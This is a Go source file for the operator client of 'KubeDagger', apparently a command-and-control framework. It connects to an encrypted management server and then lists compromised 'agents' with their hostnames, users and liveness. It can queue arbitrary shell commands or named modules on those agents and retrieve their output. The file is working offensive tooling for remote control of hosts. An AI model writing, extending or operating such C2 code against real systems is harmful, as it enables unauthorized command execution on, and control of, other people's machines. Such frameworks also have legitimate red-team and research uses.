package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
	"github.com/yasindce1998/KubeDagger/pkg/kubedagger/c2"
)

func main() {
	var (
		mgmtAddr = flag.String("addr", "127.0.0.1:9443", "management server address")
		key      = flag.String("key", "", "encryption key (hex or passphrase)")
		logLevel = flag.String("log-level", "warn", "log level")
	)
	flag.Parse()

	level, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logrus.Fatalf("invalid log level: %v", err)
	}
	logrus.SetLevel(level)

	if *key == "" {
		fmt.Fprintln(os.Stderr, "error: -key is required")
		os.Exit(1)
	}

	derivedKey, err := c2.DeriveKey(*key)
	if err != nil {
		logrus.Fatalf("derive key: %v", err)
	}

	client, err := c2.NewClient(derivedKey)
	if err != nil {
		logrus.Fatalf("create client: %v", err)
	}
	defer client.Close()

	if err := client.Connect(*mgmtAddr); err != nil {
		logrus.Fatalf("connect: %v", err)
	}

	args := flag.Args()
	if len(args) == 0 {
		printUsage()
		os.Exit(1)
	}

	switch args[0] {
	case "agents":
		cmdAgents(client)
	case "shell":
		cmdShell(client, args[1:])
	case "module":
		cmdModule(client, args[1:])
	case "tasks":
		cmdTasks(client, args[1:])
	case "status":
		cmdStatus(client, args[1:])
	default:
		fmt.Fprintf(os.Stderr, "unknown command: %s\n", args[0])
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Fprintln(os.Stderr, `Usage: kubedagger-operator -key <key> -addr <host:port> <command> [args...]

Commands:
  agents                     List connected agents
  shell  <agent-id> <cmd>    Execute shell command on agent
  module <agent-id> <name>   Run a module on agent
  tasks  <agent-id>          List tasks for an agent
  status <task-id>           Get task status/output`)
}

func cmdAgents(client *c2.Client) {
	resp := sendMgmt(client, c2server.MgmtCommand{Action: "agents"})

	agents, ok := resp.Data.([]interface{})
	if !ok || len(agents) == 0 {
		fmt.Println("No agents connected.")
		return
	}

	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, "ID\tHOSTNAME\tOS\tARCH\tUSER\tLAST SEEN\tSTATUS")
	for _, a := range agents {
		m, _ := a.(map[string]interface{})
		lastSeen := ""
		if t, ok := m["last_seen"].(string); ok {
			if parsed, err := time.Parse(time.RFC3339, t); err == nil {
				lastSeen = time.Since(parsed).Truncate(time.Second).String() + " ago"
			}
		}
		status := "dead"
		if alive, ok := m["alive"].(bool); ok && alive {
			status = "alive"
		}
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
			getStr(m, "id"),
			getStr(m, "hostname"),
			getStr(m, "os"),
			getStr(m, "arch"),
			getStr(m, "user"),
			lastSeen,
			status,
		)
	}
	w.Flush()
}

func cmdShell(client *c2.Client, args []string) {
	if len(args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: shell <agent-id> <command...>")
		os.Exit(1)
	}

	agentID := args[0]
	command := strings.Join(args[1:], " ")

	resp := sendMgmt(client, c2server.MgmtCommand{
		Action:  "queue",
		AgentID: agentID,
		Type:    c2server.TaskShell,
		Payload: map[string]string{"command": command},
	})

	if resp.Error != "" {
		fmt.Fprintf(os.Stderr, "error: %s\n", resp.Error)
		os.Exit(1)
	}

	if task, ok := resp.Data.(map[string]interface{}); ok {
		fmt.Printf("Task queued: %s\n", getStr(task, "task_id"))
	}
}

func cmdModule(client *c2.Client, args []string) {
	if len(args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: module <agent-id> <module-name> [key=value...]")
		os.Exit(1)
	}

	agentID := args[0]
	moduleName := args[1]
	payload := map[string]string{"name": moduleName}

	for _, kv := range args[2:] {
		parts := strings.SplitN(kv, "=", 2)
		if len(parts) == 2 {
			payload[parts[0]] = parts[1]
		}
	}

	resp := sendMgmt(client, c2server.MgmtCommand{
		Action:  "queue",
		AgentID: agentID,
		Type:    c2server.TaskModule,
		Payload: payload,
	})

	if resp.Error != "" {
		fmt.Fprintf(os.Stderr, "error: %s\n", resp.Error)
		os.Exit(1)
	}

	if task, ok := resp.Data.(map[string]interface{}); ok {
		fmt.Printf("Task queued: %s\n", getStr(task, "task_id"))
	}
}

func cmdTasks(client *c2.Client, args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "usage: tasks <agent-id>")
		os.Exit(1)
	}

	resp := sendMgmt(client, c2server.MgmtCommand{
		Action:  "agent_tasks",
		AgentID: args[0],
	})

	if resp.Error != "" {
		fmt.Fprintf(os.Stderr, "error: %s\n", resp.Error)
		os.Exit(1)
	}

	tasks, ok := resp.Data.([]interface{})
	if !ok || len(tasks) == 0 {
		fmt.Println("No tasks.")
		return
	}

	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, "TASK ID\tTYPE\tSTATUS\tOUTPUT")
	for _, t := range tasks {
		m, _ := t.(map[string]interface{})
		output := getStr(m, "output")
		if len(output) > 60 {
			output = output[:57] + "..."
		}
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\n",
			getStr(m, "task_id"),
			getStr(m, "type"),
			getStr(m, "status"),
			output,
		)
	}
	w.Flush()
}

func cmdStatus(client *c2.Client, args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "usage: status <task-id>")
		os.Exit(1)
	}

	resp := sendMgmt(client, c2server.MgmtCommand{
		Action: "task_status",
		TaskID: args[0],
	})

	if resp.Error != "" {
		fmt.Fprintf(os.Stderr, "error: %s\n", resp.Error)
		os.Exit(1)
	}

	if task, ok := resp.Data.(map[string]interface{}); ok {
		fmt.Printf("Task:   %s\n", getStr(task, "task_id"))
		fmt.Printf("Type:   %s\n", getStr(task, "type"))
		fmt.Printf("Status: %s\n", getStr(task, "status"))
		if output := getStr(task, "output"); output != "" {
			fmt.Printf("Output:\n%s\n", output)
		}
		if errMsg := getStr(task, "error"); errMsg != "" {
			fmt.Printf("Error:  %s\n", errMsg)
		}
	}
}

func sendMgmt(client *c2.Client, cmd c2server.MgmtCommand) c2server.MgmtResponse {
	data, err := json.Marshal(cmd)
	if err != nil {
		logrus.Fatalf("marshal command: %v", err)
	}

	respData, err := client.SendCommand(data)
	if err != nil {
		logrus.Fatalf("send command: %v", err)
	}

	var resp c2server.MgmtResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		logrus.Fatalf("unmarshal response: %v", err)
	}

	return resp
}

func getStr(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		return fmt.Sprintf("%v", v)
	}
	return ""
}
